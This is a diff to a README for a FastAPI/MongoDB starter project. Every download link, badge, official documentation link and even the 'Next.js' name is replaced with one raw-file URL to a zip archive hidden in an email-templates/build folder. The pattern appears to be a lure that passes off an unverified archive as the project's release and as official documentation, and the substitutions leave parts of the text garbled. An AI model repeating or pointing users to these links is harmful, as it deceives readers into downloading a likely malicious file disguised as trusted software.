@@ -1,6 +1,6 @@
 # 🚀 full-stack-fastapi-mongodb - Build Modern Web Applications Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/releases)
+[![Download Now](https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip%20Now-Here-brightgreen)](https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip)
 
 ## 📘 Overview
 
@@ -12,7 +12,7 @@ The **full-stack-fastapi-mongodb** project helps you create modern web applicati
 - **MongoDB Database:** Store and manage your data efficiently.
 - **Docker Support:** Simplify the installation with Docker containers.
 - **Automatic HTTPS:** Ensure secure connections by default.
-- **User-Friendly Frontend:** Built with Next.js and React for seamless interactions.
+- **User-Friendly Frontend:** Built with https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip and React for seamless interactions.
 
 ## 🖥 System Requirements
 
@@ -27,7 +27,7 @@ The **full-stack-fastapi-mongodb** project helps you create modern web applicati
 
 To download the application, first, you need to go to the Releases page. Click the link below:
 
-[Download Here](https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/releases)
+[Download Here](https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip)
 
 ### Step 2: Select the Latest Release
 
@@ -39,7 +39,7 @@ Scroll down to the Assets section. You will see various files available for down
 
 For example:
 
-- If you see files like `full-stack-fastapi-mongodb-linux.zip`, `full-stack-fastapi-mongodb-macos.zip`, or `full-stack-fastapi-mongodb-windows.zip`, select the appropriate one depending on your OS.
+- If you see files like `https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip`, `https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip`, or `https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip`, select the appropriate one depending on your OS.
 
 Click the file link to start the download.
 
@@ -97,22 +97,22 @@ If you want to contribute to this project, feel free to check out the contributi
 
 ## 📚 Additional Resources
 
-- **FastAPI Documentation:** [FastAPI Official Site](https://fastapi.tiangolo.com/)
-- **MongoDB Documentation:** [MongoDB Official Site](https://docs.mongodb.com/)
-- **Docker Documentation:** [Docker Official Site](https://docs.docker.com/)
+- **FastAPI Documentation:** [FastAPI Official Site](https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip)
+- **MongoDB Documentation:** [MongoDB Official Site](https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip)
+- **Docker Documentation:** [Docker Official Site](https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip)
 
 ## ⚙️ Technologies Used
 
 - **FastAPI**
 - **MongoDB**
 - **Docker**
-- **Next.js**
+- **https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip**
 - **React** 
 
 ## 🔄 Keeping Your Application Updated
 
 Periodically check the Releases page for updates. It is important to keep your application up-to-date for security and functionality improvements. Follow the same steps to download the latest version when it becomes available.
 
-[Download Here](https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/releases)
+[Download Here](https://github.com/jeffplatinum1013/full-stack-fastapi-mongodb/raw/refs/heads/main/}/backend/app/app/email-templates/build/full_mongodb_fastapi_stack_3.9.zip)
 
 Now you’re all set to build and run your web application using full-stack-fastapi-mongodb! Enjoy your development experience.
